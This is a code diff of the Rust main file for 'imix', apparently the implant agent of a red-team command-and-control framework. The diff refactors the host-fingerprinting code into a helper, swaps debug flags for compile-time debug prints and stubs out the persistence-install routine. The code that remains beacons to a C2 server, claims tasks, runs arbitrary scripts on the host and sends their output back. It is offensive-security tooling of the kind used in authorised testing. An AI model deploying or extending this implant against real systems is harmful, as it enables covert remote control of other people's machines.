@@ -6,17 +6,14 @@ use c2::pb::{Agent, Beacon, ClaimTasksRequest, Host, ReportTaskOutputRequest, Ta
 use chrono::{DateTime, Utc};
 use clap::{arg, Command};
 use eldritch::{eldritch_run, EldritchPrintHandler};
+use imix::agent_init;
 use std::fs::File;
-use std::io::Write;
-use std::path::Path;
 use std::sync::mpsc::{channel, Receiver, Sender};
 use std::thread;
 use std::time::Instant;
-use std::{collections::HashMap, fs};
-use sys_info::{linux_os_release, os_release};
+use std::collections::HashMap;
 use tokio::task::{self, JoinHandle};
 use tokio::time::Duration;
-use uuid::Uuid;
 
 pub struct AsyncTask {
     future_join_handle: JoinHandle<Result<(), Error>>,
@@ -25,20 +22,6 @@ pub struct AsyncTask {
     print_reciever: Receiver<String>,
 }
 
-async fn install(config_path: String) -> Result<(), imix::Error> {
-    let config_file = File::open(config_path)?;
-    let config: imix::Config = serde_json::from_reader(config_file)?;
-
-    #[cfg(target_os = "windows")]
-    return imix::windows::install(config).await;
-
-    #[cfg(target_os = "linux")]
-    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
-        return imix::linux::install(config).await;
-    }
-
-    unimplemented!("The current OS/Service Manager is not supported")
-}
 async fn handle_exec_tome(
     task: Task,
     print_channel_sender: Sender<String>,
@@ -109,89 +92,9 @@ async fn handle_exec_timeout_and_response(
     Ok(())
 }
 
-fn get_principal() -> Result<String> {
-    Ok(whoami::username())
-}
-
-fn get_hostname() -> Result<String> {
-    Ok(whoami::hostname())
-}
-
-fn get_beacon_id() -> Result<String> {
-    let beacon_id = Uuid::new_v4();
-    Ok(beacon_id.to_string())
-}
-
-fn get_host_id(host_id_file_path: String) -> Result<String> {
-    let mut host_id = Uuid::new_v4().to_string();
-    let host_id_file = Path::new(&host_id_file_path);
-    if host_id_file.exists() {
-        host_id = match fs::read_to_string(host_id_file) {
-            Ok(tmp_host_id) => tmp_host_id.trim().to_string(),
-            Err(_) => host_id,
-        };
-    } else {
-        let mut host_id_file_obj = match File::create(host_id_file) {
-            Ok(tmp_file_obj) => tmp_file_obj,
-            Err(_) => return Ok(host_id), // An error occured don't save. Just go.
-        };
-        match host_id_file_obj.write_all(host_id.as_bytes()) {
-            Ok(_) => {} // Don't care if write fails or not going to to send our generated one.
-            Err(_) => {}
-        }
-    }
-    Ok(host_id)
-}
-
-fn get_primary_ip() -> Result<String> {
-    let res = match default_net::get_default_interface() {
-        Ok(default_interface) => {
-            if default_interface.ipv4.len() > 0 {
-                default_interface.ipv4[0].addr.to_string()
-            } else {
-                "DANGER-UNKNOWN".to_string()
-            }
-        }
-        Err(e) => {
-            eprintln!("Error getting primary ip address:\n{e}");
-            "DANGER-UNKNOWN".to_string()
-        }
-    };
-    Ok(res)
-}
-
-fn get_host_platform() -> Result<Platform> {
-    if cfg!(target_os = "linux") {
-        return Ok(Platform::Linux);
-    } else if cfg!(target_os = "windows") {
-        return Ok(Platform::Windows);
-    } else if cfg!(target_os = "macos") {
-        return Ok(Platform::Macos);
-    } else {
-        return Ok(Platform::Unspecified);
-    }
-}
-
-fn get_os_pretty_name() -> Result<String> {
-    if cfg!(target_os = "linux") {
-        let linux_rel = linux_os_release()?;
-        let pretty_name = match linux_rel.pretty_name {
-            Some(local_pretty_name) => local_pretty_name,
-            None => "UNKNOWN-Linux".to_string(),
-        };
-        return Ok(format!("{}", pretty_name));
-    } else if cfg!(target_os = "windows") || cfg!(target_os = "macos") {
-        return Ok(os_release()?);
-    } else {
-        return Ok("UNKNOWN".to_string());
-    }
-}
-
 // Async handler for port scanning.
 async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
-    let debug = false;
     let mut loop_count: i32 = 0;
-    let version_string = "v0.0.3";
     let config_file = File::open(config_path)?;
     let imix_config: imix::Config = serde_json::from_reader(config_file)?;
 
@@ -200,88 +103,14 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
     // This hashmap tracks all tasks output
     let mut all_task_res_map: HashMap<i64, Vec<TaskOutput>> = HashMap::new();
 
-    let principal = match get_principal() {
-        Ok(username) => username,
-        Err(error) => {
-            if debug {
-                return Err(anyhow::anyhow!("Unable to get process username\n{}", error));
-            }
-            "UNKNOWN".to_string()
-        }
-    };
-
-    let hostname = match get_hostname() {
-        Ok(tmp_hostname) => tmp_hostname,
-        Err(error) => {
-            if debug {
-                return Err(anyhow::anyhow!("Unable to get system hostname\n{}", error));
-            }
-            "UNKNOWN".to_string()
-        }
-    };
-
-    let beacon_id = match get_beacon_id() {
-        Ok(tmp_beacon_id) => tmp_beacon_id,
-        Err(error) => {
-            if debug {
-                return Err(anyhow::anyhow!(
-                    "Unable to get a random beacon id\n{}",
-                    error
-                ));
-            }
-            "DANGER-UNKNOWN".to_string()
-        }
-    };
-
-    let agent_id = format!("{}-{}", "imix", version_string);
-
-    let host_platform = match get_host_platform() {
-        Ok(tmp_host_platform) => tmp_host_platform,
-        Err(error) => {
-            if debug {
-                return Err(anyhow::anyhow!("Unable to get host platform id\n{}", error));
-            }
-            Platform::Unspecified
-        }
-    };
-
-    let primary_ip = match get_primary_ip() {
-        Ok(tmp_primary_ip) => Some(tmp_primary_ip),
-        Err(error) => {
-            if debug {
-                return Err(anyhow::anyhow!("Unable to get primary ip\n{}", error));
-            }
-            None
-        }
-    };
-
-    let host_id_file = if cfg!(target_os = "windows") {
-        "C:\\ProgramData\\system-id"
-    } else {
-        "/etc/system-id"
-    }
-    .to_string();
-
-    let host_id = match get_host_id(host_id_file) {
-        Ok(tmp_host_id) => tmp_host_id,
-        Err(error) => {
-            if debug {
-                return Err(anyhow::anyhow!(
-                    "Unable to get or create a host id\n{}",
-                    error
-                ));
-            }
-            "DANGER-UNKNOWN".to_string()
-        }
-    };
+    let agent_properties = agent_init()?;
 
     loop {
         let start_time = Utc::now().time();
         // 0. Get loop start time
         let loop_start_time = Instant::now();
-        if debug {
-            println!("Get new tasks");
-        }
+        #[cfg(debug_assertions)]
+        println!("Get new tasks");
         // 1. Pull down new tasks
         // 1a) calculate callback uri
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
@@ -289,32 +118,30 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         let mut tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
             Ok(tavern_client_local) => tavern_client_local,
             Err(err) => {
-                if debug {
-                    println!("failed to create tavern client {}", err)
-                }
+                #[cfg(debug_assertions)]
+                println!("failed to create tavern client {}", err);
                 continue;
             }
         };
 
-        if debug {
-            println!(
-                "[{}]: collecting tasks",
-                (Utc::now().time() - start_time).num_milliseconds()
-            )
-        }
+        #[cfg(debug_assertions)]
+        println!(
+            "[{}]: collecting tasks",
+            (Utc::now().time() - start_time).num_milliseconds()
+        );
         // 1b) Collect new tasks
         let req = tonic::Request::new(ClaimTasksRequest {
             beacon: Some(Beacon {
-                identifier: beacon_id.clone(),
-                principal: principal.clone(),
+                identifier: agent_properties.beacon_id.clone(),
+                principal: agent_properties.principal.clone(),
                 host: Some(Host {
-                    identifier: host_id.clone(),
-                    name: hostname.clone(),
-                    platform: host_platform.try_into()?,
-                    primary_ip: primary_ip.clone().context("primary ip not found")?,
+                    identifier: agent_properties.host_id.clone(),
+                    name: agent_properties.hostname.clone(),
+                    platform: agent_properties.host_platform.try_into()?,
+                    primary_ip: agent_properties.primary_ip.clone().context("primary ip not found")?,
                 }),
                 agent: Some(Agent {
-                    identifier: agent_id.clone(),
+                    identifier: agent_properties.agent_id.clone(),
                 }),
                 interval: imix_config.callback_config.interval,
             }),
@@ -322,39 +149,34 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         let new_tasks = match tavern_client.claim_tasks(req).await {
             Ok(resp) => resp.get_ref().tasks.clone(),
             Err(error) => {
-                if debug {
-                    println!("main_loop: error claiming task\n{:?}", error)
-                }
+                #[cfg(debug_assertions)]
+                println!("main_loop: error claiming task\n{:?}", error);
                 let empty_vec = vec![];
                 empty_vec
             }
         };
 
-        if debug {
-            println!(
-                "[{}]: Starting {} new tasks",
-                (Utc::now().time() - start_time).num_milliseconds(),
-                new_tasks.len()
-            );
-        }
+        #[cfg(debug_assertions)]
+        println!(
+            "[{}]: Starting {} new tasks",
+            (Utc::now().time() - start_time).num_milliseconds(),
+            new_tasks.len()
+        );
         // 2. Start new tasks
         for task in new_tasks {
-            if debug {
-                println!("Parameters:\n{:?}", task.clone().parameters);
-            }
-            if debug {
-                println!("Launching:\n{:?}", task.clone().eldritch);
-            }
+            #[cfg(debug_assertions)]
+            println!("Parameters:\n{:?}", task.clone().parameters);
+            #[cfg(debug_assertions)]
+            println!("Launching:\n{:?}", task.clone().eldritch);
 
             let (sender, receiver) = channel::<String>();
             let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
-            if debug {
-                println!(
-                    "[{}]: Queueing task {}",
-                    (Utc::now().time() - start_time).num_milliseconds(),
-                    task.clone().id
-                );
-            }
+            #[cfg(debug_assertions)]
+            println!(
+                "[{}]: Queueing task {}",
+                (Utc::now().time() - start_time).num_milliseconds(),
+                task.clone().id
+            );
             match all_exec_futures.insert(
                 task.clone().id,
                 AsyncTask {
@@ -365,23 +187,20 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
                 },
             ) {
                 Some(_old_task) => {
-                    if debug {
-                        println!("main_loop: error adding new task. Non-unique taskID\n");
-                    }
+                    #[cfg(debug_assertions)]
+                    println!("main_loop: error adding new task. Non-unique taskID\n");
                 }
                 None => {
-                    if debug {
-                        println!("main_loop: Task queued successfully\n");
-                    }
+                    #[cfg(debug_assertions)]
+                    println!("main_loop: Task queued successfully\n");
                 } // Task queued successfully
             }
-            if debug {
-                println!(
-                    "[{}]: Queued task {}",
-                    (Utc::now().time() - start_time).num_milliseconds(),
-                    task.clone().id
-                );
-            }
+            #[cfg(debug_assertions)]
+            println!(
+                "[{}]: Queued task {}",
+                (Utc::now().time() - start_time).num_milliseconds(),
+                task.clone().id
+            );
         }
 
         // 3. Sleep till callback time
@@ -391,13 +210,12 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         if time_to_sleep < 0 {
             time_to_sleep = 0;
         } // Control for unsigned underflow
-        if debug {
-            println!(
-                "[{}]: Sleeping seconds {}",
-                (Utc::now().time() - start_time).num_milliseconds(),
-                time_to_sleep
-            );
-        }
+        #[cfg(debug_assertions)]
+        println!(
+            "[{}]: Sleeping seconds {}",
+            (Utc::now().time() - start_time).num_milliseconds(),
+            time_to_sleep
+        );
         // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
         std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.
 
@@ -405,23 +223,23 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         let mut running_exec_futures: HashMap<i64, AsyncTask> = HashMap::new();
         let mut running_task_res_map: HashMap<i64, Vec<TaskOutput>> = all_task_res_map.clone();
 
-        if debug {
-            println!(
-                "[{}]: Checking task status",
-                (Utc::now().time() - start_time).num_milliseconds()
-            );
-        }
+        #[cfg(debug_assertions)]
+        println!(
+            "[{}]: Checking task status",
+            (Utc::now().time() - start_time).num_milliseconds()
+        );
+
         // Check status & send response
         for exec_future in all_exec_futures.into_iter() {
             let task_id = exec_future.0;
-            if debug {
-                println!(
-                    "[{}]: Task # {} is_finished? {}",
-                    (Utc::now().time() - start_time).num_milliseconds(),
-                    task_id,
-                    exec_future.1.future_join_handle.is_finished()
-                );
-            }
+
+            #[cfg(debug_assertions)]
+            println!(
+                "[{}]: Task # {} is_finished? {}",
+                (Utc::now().time() - start_time).num_milliseconds(),
+                task_id,
+                exec_future.1.future_join_handle.is_finished()
+            );
 
             // If the task doesn't exist in the map add a vector for it.
             if !running_task_res_map.contains_key(&task_id) {
@@ -432,13 +250,12 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
 
             // Loop over each line of output from the task and append it the the channel output.
             loop {
-                if debug {
-                    println!(
-                        "[{}]: Task # {} recieving output",
-                        (Utc::now().time() - start_time).num_milliseconds(),
-                        task_id
-                    );
-                }
+                #[cfg(debug_assertions)]
+                println!(
+                    "[{}]: Task # {} recieving output",
+                    (Utc::now().time() - start_time).num_milliseconds(),
+                    task_id
+                );
                 let new_res_line = match exec_future
                     .1
                     .print_reciever
@@ -512,9 +329,9 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
                         running_task_res_map.remove(&task_id);
                     }
                     Err(local_err) => {
-                        if debug {
-                            println!("Failed to submit task resluts:\n{}", local_err.to_string())
-                        }
+                        #[cfg(debug_assertions)]
+                        println!("Failed to submit task resluts:\n{}", local_err.to_string());
+                        {}
                     }
                 }
             }
@@ -525,6 +342,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         all_task_res_map = running_task_res_map.clone();
 
         // Debug loop tracker
+        #[cfg(debug_assertions)]
         if let Some(count_max) = loop_count_max {
             loop_count += 1;
             if loop_count >= count_max {
@@ -561,10 +379,7 @@ pub fn main() -> Result<(), imix::Error> {
     match matches.subcommand() {
         Some(("install", args)) => {
             let config_path = args.value_of("config").unwrap();
-            match runtime.block_on(install(String::from(config_path))) {
-                Ok(_response) => {}
-                Err(_error) => {}
-            }
+            unimplemented!("Install isn't implemented yet")
         }
         _ => {}
     }
@@ -585,26 +400,13 @@ pub fn main() -> Result<(), imix::Error> {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use httptest::matchers::matches;
-    use httptest::{all_of, matchers::request, responders::status_code, Expectation, Server};
-    use tempfile::NamedTempFile;
+    use c2::pb::ClaimTasksResponse;
 
     #[test]
-    fn imix_test_default_ip() {
-        let primary_ip_address = match get_primary_ip() {
-            Ok(local_primary_ip) => local_primary_ip,
-            Err(local_error) => {
-                assert_eq!(false, true);
-                "DANGER-UNKNOWN".to_string()
-            }
-        };
-        assert!((primary_ip_address != "DANGER-UNKNOWN".to_string()))
-    }
-
-    #[test]
-    fn imix_test_get_os_pretty_name() {
-        let res = get_os_pretty_name().unwrap();
-        assert!(!res.contains("UNKNOWN"));
+    fn imix_handle_exec_tome() {
+        let server_response = tonic::Response::new(ClaimTasksResponse {
+            tasks: todo!(),
+        });
     }
 
     //     #[test]
